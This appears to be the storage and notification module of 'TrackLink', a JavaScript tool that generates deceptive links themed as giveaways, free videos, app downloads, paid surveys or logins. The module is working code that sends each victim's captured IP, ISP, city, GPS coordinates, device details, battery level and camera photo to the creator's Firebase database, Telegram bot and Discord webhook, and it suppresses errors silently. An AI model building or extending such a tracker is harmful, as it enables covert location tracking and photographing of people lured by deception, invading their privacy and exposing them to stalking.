/**
 * Storage — TrackLink
 * Firebase Realtime Database sebagai backend agar data visitor masuk ke dashboard creator
 */

const STORAGE_KEY  = 'tracker_links';
const SETTINGS_KEY = 'tracker_settings';

/* ── Settings ─────────────────────────────────────────────── */
export function getSettings() {
  try { return JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}'); }
  catch { return {}; }
}
export function saveSettings(s) {
  localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
}

/* ── Config encode/decode ─────────────────────────────────── */
export function encodeConfig(config) {
  return btoa(unescape(encodeURIComponent(JSON.stringify(config))))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}
export function decodeConfig(encoded) {
  try {
    const b64 = encoded.replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(decodeURIComponent(escape(atob(b64))));
  } catch { return null; }
}

/* ── Firebase Realtime Database (REST API, tanpa SDK) ─────── */
// Tulis capture ke Firebase agar creator bisa lihat data orang lain
export async function writeToFirebase(fbUrl, linkId, capture) {
  if (!fbUrl) return;
  const url = `${fbUrl.replace(/\/$/, '')}/captures/${linkId}.json`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(capture),
    });
    if (!response.ok) {
        console.error('Firebase POST gagal:', response.statusText);
    }
  } catch (error) {
    console.error('Gagal tulis ke Firebase:', error);
  }
}

// Baca semua captures dari Firebase untuk satu link
export async function readFromFirebase(fbUrl, linkId) {
  if (!fbUrl) return [];
  const url = `${fbUrl.replace(/\/$/, '')}/captures/${linkId}.json`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (!data || typeof data !== 'object') return [];
    // Firebase POST mengembalikan object { "-key1": {...}, "-key2": {...} }
    return Object.values(data).filter(Boolean);
  } catch { return []; }
}

// Baca captures untuk SEMUA link milik creator dari Firebase
export async function readAllFromFirebase(fbUrl) {
  if (!fbUrl) return {};
  const url = `${fbUrl.replace(/\/$/, '')}/captures.json`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (!data || typeof data !== 'object') return {};
    // { linkId: { "-key": capture, ... }, ... }
    const result = {};
    for (const [linkId, entries] of Object.entries(data)) {
      if (entries && typeof entries === 'object') {
        result[linkId] = Object.values(entries).filter(Boolean);
      }
    }
    return result;
  } catch { return {}; }
}

/* ── Links (dashboard history) ────────────────────────────── */
export function getLinks() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
  catch { return []; }
}
export function saveLinks(links) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(links));
}

const THEME_PATHS = {
  article:  'berita/info-terkini',
  giveaway: 'hadiah/pemenang-beruntung',
  video:    'video/nonton-gratis-hd',
  download: 'unduh/aplikasi-gratis',
  survey:   'survey/berhadiah-jutaan',
  login:    'masuk/akun-spesial',
};

export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
  const links    = getLinks();
  const settings = getSettings();
  const id       = generateId();
  const theme    = decoyTheme || 'article';

  const config = {
    id,
    decoyTheme: theme,
    options: { trackIp, trackDevice, trackBattery, trackCamera },
    // Sertakan Firebase URL saja (aman jika Rules Firebase dikunci per link)
    notif: {
      tg: null,
      dc: null,
      fb: settings.firebaseUrl || null,
    },
  };

  const encoded   = encodeConfig(config);
  const themePath = THEME_PATHS[theme] || 'info/terbaru';

  const newLink = {
    id, name: name || `Link #${links.length + 1}`,
    encoded, themePath, decoyTheme: theme,
    options: config.options, captures: [],
    createdAt: new Date().toISOString(),
  };
  links.unshift(newLink);
  saveLinks(links);
  return newLink;
}

export function getLinkById(id) {
  return getLinks().find(l => l.id === id) || null;
}

export async function addCapture(linkId, capture, notifOverride) {
  const links = getLinks();
  const idx   = links.findIndex(l => l.id === linkId);
  const captureWithMeta = { ...capture, id: generateId(), at: new Date().toISOString() };

  // Simpan ke localStorage (untuk creator di browser sendiri)
  if (idx !== -1) {
    links[idx].captures.push(captureWithMeta);
    saveLinks(links);
  }

  const settings  = notifOverride || getSettings();
  const linkName  = idx !== -1 ? links[idx].name : 'TrackLink';

  // ← KUNCI: tulis ke Firebase agar data visitor masuk ke dashboard creator
  const fbUrl = settings.fb || settings.firebaseUrl;
  if (fbUrl) {
    await writeToFirebase(fbUrl, linkId, captureWithMeta);
  }

  // Kirim notifikasi hanya jika settings tersedia di dashboard
  // (tidak menggunakan notifOverride dari config URL)
  if (settings.telegramToken && settings.telegramChatId) {
    const tg = { token: settings.telegramToken, chatId: settings.telegramChatId };
    await sendNotificationToTelegram(tg, linkName, linkId, captureWithMeta);
  }
  if (settings.discordWebhook) {
    await sendNotificationToDiscord(settings.discordWebhook, linkName, linkId, captureWithMeta);
  }

  return idx !== -1 ? links[idx] : null;
}

export function deleteLink(id) { saveLinks(getLinks().filter(l => l.id !== id)); }
export function clearLinks()   { saveLinks([]); }

/* ── Notification ─────────────────────────────────────────── */
export async function sendNotificationToTelegram(tg, linkName, linkId, cap) {
  if (!tg?.token || !tg?.chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${tg.token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: tg.chatId,
        text: buildTelegramMsg(linkName, cap),
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    if (cap.photo) {
      const blob = await (await fetch(cap.photo)).blob();
      const fd   = new FormData();
      fd.append('chat_id', tg.chatId);
      fd.append('photo',   blob, 'capture.jpg');
      fd.append('caption', `📷 Foto — ${linkName}`);
      await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, { method: 'POST', body: fd });
    }
  } catch { /* silent */ }
}

export async function sendNotificationToDiscord(dc, linkName, linkId, cap) {
  if (!dc) return;
  try {
    await fetch(dc, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: '🎯 TrackLink',
        embeds: [{ title: `🔔 ${linkName}`, color: 0x22c55e, fields: buildDiscordFields(cap), timestamp: new Date().toISOString() }],
      }),
    });
  } catch { /* silent */ }
}

export async function sendNotification(settings, linkName, linkId, cap) {
  const tg = settings.tg || (settings.telegramToken && settings.telegramChatId
    ? { token: settings.telegramToken, chatId: settings.telegramChatId }
    : null);
  const dc = settings.dc || settings.discordWebhook || null;

  if (tg) await sendNotificationToTelegram(tg, linkName, linkId, cap);
  if (dc) await sendNotificationToDiscord(dc, linkName, linkId, cap);
}

function buildTelegramMsg(linkName, cap) {
  const lines = [`🎯 <b>CAPTURE BARU!</b>`, `📌 Link: <b>${linkName}</b>`, ``];
  if (cap.ip)      lines.push(`🌍 <b>IP:</b> <code>${cap.ip}</code>`);
  if (cap.country) lines.push(`📍 <b>Lokasi:</b> ${[cap.city, cap.region, cap.country].filter(Boolean).join(', ')}`);
  if (cap.isp)     lines.push(`📡 <b>ISP:</b> ${cap.isp}`);
  if (cap.lat)     lines.push(`🗺 <b>Koordinat:</b> <a href="https://maps.google.com/?q=${cap.lat},${cap.lon}">${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}</a>${cap.locationSource === 'GPS' ? ` ✓ GPS ±${cap.gpsAccuracy}m` : ' (IP)'}`);
  if (cap.device)  lines.push(`📱 <b>Perangkat:</b> ${cap.device}`);
  if (cap.os)      lines.push(`💻 <b>OS:</b> ${cap.os} — ${cap.browser}`);
  if (cap.touch)   lines.push(`👆 <b>Tipe:</b> ${cap.touch}`);
  if (cap.screen)  lines.push(`🖥 <b>Layar:</b> ${cap.screen}`);
  if (cap.connection) lines.push(`📶 <b>Koneksi:</b> ${cap.connection}`);
  if (cap.battery !== undefined && cap.battery !== null)
    lines.push(`🔋 <b>Baterai:</b> ${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`);
  lines.push(``, `⏱ ${new Date(cap.at || Date.now()).toLocaleString('id-ID')}`);
  return lines.join('\n');
}

function buildDiscordFields(cap) {
  const f = [];
  if (cap.ip)      f.push({ name: '🌍 IP',        value: `\`${cap.ip}\``, inline: true });
  if (cap.country) f.push({ name: '📍 Lokasi',     value: [cap.city, cap.region, cap.country].filter(Boolean).join(', '), inline: true });
  if (cap.isp)     f.push({ name: '📡 ISP',        value: cap.isp, inline: true });
  if (cap.lat)     f.push({ name: '🗺 Koordinat',  value: `[${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}](https://maps.google.com/?q=${cap.lat},${cap.lon})`, inline: true });
  if (cap.device)  f.push({ name: '📱 Perangkat',  value: cap.device, inline: true });
  if (cap.os)      f.push({ name: '💻 OS/Browser', value: `${cap.os} — ${cap.browser}`, inline: true });
  if (cap.screen)  f.push({ name: '🖥 Layar',      value: cap.screen, inline: true });
  if (cap.touch)   f.push({ name: '👆 Tipe',       value: cap.touch, inline: true });
  if (cap.battery !== undefined && cap.battery !== null)
    f.push({ name: '🔋 Baterai', value: `${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`, inline: true });
  if (cap.locationSource === 'GPS')
    f.push({ name: '📡 Akurasi', value: `GPS ±${cap.gpsAccuracy}m`, inline: true });
  return f;
}

function generateId() {
  return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}
